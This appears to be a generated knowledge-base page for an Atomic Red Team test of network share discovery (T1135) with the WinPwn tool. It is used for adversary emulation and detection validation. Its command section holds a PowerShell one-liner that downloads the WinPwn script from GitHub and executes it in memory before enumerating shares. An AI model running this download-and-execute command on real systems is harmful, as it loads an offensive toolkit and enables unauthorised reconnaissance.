---
atomic_guid: "987901d1-5b87-4558-a6d9-cffcabc638b8"
title: "WinPwn - shareenumeration"
framework: "atomic"
generated: "true"
attack_technique_id: "T1135"
attack_technique_name: "Network Share Discovery"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1135/T1135.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "987901d1-5b87-4558-a6d9-cffcabc638b8"
  - "WinPwn - shareenumeration"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# WinPwn - shareenumeration

Network share enumeration using the shareenumeration function of WinPwn

## Metadata

- Atomic GUID: 987901d1-5b87-4558-a6d9-cffcabc638b8
- Technique: T1135: Network Share Discovery
- Platforms: windows
- Executor: powershell
- Source Path: atomics/T1135/T1135.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1135-network_share_discovery|T1135]]

## Executor

- name: powershell

### Command

```powershell
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
shareenumeration -noninteractive -consoleoutput
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1135/T1135.yaml)
